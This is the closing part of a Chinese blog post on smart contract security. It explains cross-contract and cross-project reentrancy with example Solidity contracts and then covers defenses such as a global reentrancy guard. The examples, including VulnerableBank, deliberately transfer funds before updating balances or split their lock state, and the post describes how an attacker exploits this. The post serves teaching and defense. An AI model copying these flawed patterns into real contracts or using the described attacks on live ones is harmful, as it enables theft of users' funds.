+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">swapPath</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="n">safeTransfer</span><span class="p">(</span><span class="n">swap</span><span class="p">.</span><span class="n">user</span><span class="p">,</span> <span class="n">swap</span><span class="p">.</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>TwoStepSwapManager</code>有两个主要的函数，<code>createSwap</code>发起转账交易，<code>cancelSwap</code>用于取消某个等待执行的swap交易函数</p>
+<p>另一个合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TwoStepSwapExecutor</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="n">_status</span><span class="p">;</span> <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">modifier</span> <span class="nf">nonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在第一次调用 nonReentrant 时，_status 将是 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在此之后对 nonReentrant 的任何调用都将失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 调用结束，将 _status 恢复为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">_status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">executeSwap</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_id</span><span class="p">)</span> <span class="k">external</span> <span class="n">onlySwapExecutor</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Swap</span> <span class="k">memory</span> <span class="n">swap</span> <span class="o">=</span> <span class="n">ISwapManager</span><span class="p">(</span><span class="n">swapManager</span><span class="p">).</span><span class="n">pendingSwaps</span><span class="p">(</span><span class="n">_id</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ISwapManager</span><span class="p">(</span><span class="n">swapManager</span><span class="p">).</span><span class="n">swap</span><span class="p">(</span><span class="n">swap</span><span class="p">.</span><span class="n">user</span><span class="p">,</span> <span class="n">swap</span><span class="p">.</span><span class="n">amount</span><span class="p">,</span> <span class="n">swap</span><span class="p">.</span><span class="n">swapPath</span><span class="p">,</span> <span class="n">swap</span><span class="p">.</span><span class="n">unwrapNativeToken</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ISwapManager</span><span class="p">(</span><span class="n">swapManager</span><span class="p">).</span><span class="k">delete</span><span class="p">(</span><span class="n">pendingSwaps</span><span class="p">[</span><span class="n">_id</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个合约用于执行某个处于等待中的swap交易</p>
+<p>关于上面这两个合约，主要是因为两个合约的重入锁状态不互通，让攻击者有操作空间：</p>
+<p>1.管理员调用了<code>executeSwap</code>来执行了那个攻击者提交的swap，此合约的重入锁开始生效变成<code>1</code></p>
+<p>2.当运行到中间那步<code>swap</code>的时候，发起了<code>ETH</code>转账，将执行权交给了攻击者的恶意合约的<code>fallback</code>函数，在那里被设置了对<code>TwoStepSwapManager</code>合约的<code>cancelSwap</code>函数的调用，而此时这个<code>TwoStepSwapManager</code>的重入锁还是<code>0</code>，所以<code>cancelSwap</code>开始执行，此合约的重入锁开始生效变成<code>1</code></p>
+<p>3.攻击者收到了<code>executeSwap</code>发送给他的swap过来的<code>ETH</code>，同时还收到了<code>cancelSwap</code>退给他的当初送出去用来swap的本金代币，又是一个<code>双花</code>操作</p>
+<h3 id="1413跨项目重入攻击">14.1.3.跨项目重入攻击</h3>
+<p>跨项目重入攻击和上面的类似，都是借助其中一个函数/合约去攻击另外的合约，跨项目指的利用当前合约的某些状态去攻击第三方的合作项目</p>
+<p>比如有第三方合作项目的合约是依赖于前面提到的项目合约里这个状态变量的值来做某些决策的，那么攻击者就可以去攻击这个合作项目的合约，因为在此刻它读到的是一个过期的状态值，会导致它执行一些错误的行为令攻击者获利</p>
+<p>如以下合约：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">VulnerableBank</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="k">public</span> <span class="n">balances</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kt">uint256</span> <span class="k">private</span> <span class="n">_status</span><span class="p">;</span> <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 重入锁
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">modifier</span> <span class="nf">nonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在第一次调用 nonReentrant 时，_status 将是 0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="nb">require</span><span class="p">(</span><span class="n">_status</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 在此之后对 nonReentrant 的任何调用都将失败
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_status</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// 调用结束，将 _status 恢复为0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">_status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">deposit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Deposit amount must ba greater than 0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">_amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Withdrawal amount must be greater than 0&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">isAllowedToWithdraw</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amount</span><span class="p">),</span> <span class="s">&#34;Insufficient balance&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">_amount</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Withdraw failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">isAllowedToWithdraw</span><span class="p">(</span><span class="kt">address</span> <span class="n">_user</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_user</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>虽然这个合约<code>withdraw</code>已经加上了重入锁，但它提供了<code>public isAllowedToWithdraw</code>方法。当执行<code>withdraw</code>时<code>ETH</code>刚刚转出，假设攻击者想要此刻调用<code>isAllowedToWithdraw</code>函数，可以预见即便是<code>_amount</code>数值很大，攻击者的存款实际已被掏空，但返回值仍然是<code>true</code>，因为账本在此刻还没有更新</p>
+<p>攻击者就可以在他的恶意合约里的<code>fallback</code>函数中设置外部函数调用，去攻击他已知的其他项目的依据<code>isAllowedToWithdraw</code>函数返回结果来制定操作的那些合约</p>
+<h2 id="142预防方式">14.2.预防方式</h2>
+<h3 id="1421全局重入锁">14.2.1.全局重入锁</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../data/Keys.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../data/DataStore.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">abstract</span> <span class="kd">contract</span> <span class="nc">GlobalReentrancyGuard</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">NOT_ENTERED</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">private</span> <span class="k">constant</span> <span class="n">ENTERED</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DataStore</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">dataStore</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">DataStore</span> <span class="n">_datastore</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dataStore</span> <span class="o">=</span> <span class="n">_dataStore</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">modifier</span> <span class="nf">globalNonReentrant</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_nonReentrantBefore</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">_</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">_nonReentrantAfter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_nonReentrantBefore</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">status</span> <span class="o">=</span> <span class="n">dataStore</span><span class="p">.</span><span class="n">getUint</span><span class="p">(</span><span class="n">Keys</span><span class="p">.</span><span class="n">REENTRANCY_GUARD_STATUS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">NOT_ENTERED</span><span class="p">,</span> <span class="s">&#34;ReentrancyGuard: reentrant call&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">dataStore</span><span class="p">.</span><span class="n">setUint</span><span class="p">(</span><span class="n">Keys</span><span class="p">.</span><span class="n">REENTRANCY_GUARD_STATUS</span><span class="p">,</span> <span class="n">ENTERED</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_nonReentrantAfter</span><span class="p">()</span> <span class="k">private</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">dataStore</span><span class="p">.</span><span class="n">setUint</span><span class="p">(</span><span class="n">Keys</span><span class="p">.</span><span class="n">REENTRANCY_GUARD_STATUS</span><span class="p">,</span> <span class="n">NOT_ENTERED</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所谓全局重入锁，就是建立一个单独的合约用来储存重入状态，然后，在任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态，这样所有合约就都被重入保护起来了，但这<strong>并不适用跨项目重入攻击</strong></p>
+<h3 id="1422只读重入保护">14.2.2.只读重入保护</h3>
+<p>参考<a href="https://github.com/euler-xyz/euler-contracts/blob/91adeee39daf8ece00584b6f7ec3e60a1d226bc9/contracts/BaseLogic.sol" target="_blank" rel="noopener noreffer">合约</a></p>
+<h1 id="总结">总结</h1>
+<p>去中心化高度透明、自治的特性，让其智能合约更容易遭受到攻击，从而造成严重的经济损失。设计合约时，应当对各种交互设计考虑完全，尤其是涉及到转账时，需要考虑是否能利用合约的特性发起攻击。从最初的合约设计规避风险才是最好的防范方式</p>
+<h1 id="参考链接">参考链接</h1>
+<p>1.<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S01_ReentrancyAttack" target="_blank" rel="noopener noreffer">合约安全问题研究</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-12-10</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/" data-title="合约安全问题研究"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/" data-title="合约安全问题研究"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/" data-title="合约安全问题研究"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://baskep.top/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/" data-title="合约安全问题研究"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/layer0layer1layer2%E5%88%86%E7%B1%BB/" class="prev" rel="prev" title="Layer0、Layer1、Layer2分类"><i class="fas fa-angle-left fa-fw"></i>Layer0、Layer1、Layer2分类</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">早起的老年人</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10000},"comment":{},"data":{"id-1":"今天就到这里，回去等通知吧","id-2":"今天就到这里，回去等通知吧"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
